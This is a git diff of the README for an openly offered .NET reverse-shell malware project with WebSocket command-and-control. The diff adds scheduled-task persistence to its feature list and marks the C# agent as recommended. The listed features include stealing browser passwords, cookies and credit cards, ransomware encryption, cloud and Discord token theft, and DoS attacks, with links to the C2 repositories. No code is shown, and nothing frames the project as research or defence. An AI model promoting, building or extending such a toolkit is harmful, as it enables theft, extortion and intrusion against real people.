@@ -1,4 +1,4 @@
-# .NET Reverse Shell with Websockets
+# .NET Reverse Shell with WebSocket
 
 This .NET project implements a reverse shell that connects to a command and control server using WebSocket.
 
@@ -12,6 +12,7 @@ This .NET project implements a reverse shell that connects to a command and cont
 - Exfiltrate Browser Info (cookies, history, passwords, credit cards, and download history)  
 - Encrypt Files (Ransomware)  
 - Token Stealing (Discord, AWS, AZURE, GCP, etc)  
+- Persistence via Windows Scheduler
 - DOS Attack  
 
 
@@ -73,7 +74,7 @@ Implement additional security measures as needed for your specific use case.
 [C2 UI](https://github.com/The-Hustler-Hattab/c2-ui)  
 [C2 Server](https://github.com/The-Hustler-Hattab/C2JavaServer)   
 [C2 Java Agent](https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent)  
-[C2 .NET Agent](https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet)  
+[C2 C# .NET Agent (RECOMMENDED)](https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet)
 
 ## Contributing
 Contributions are welcome! 
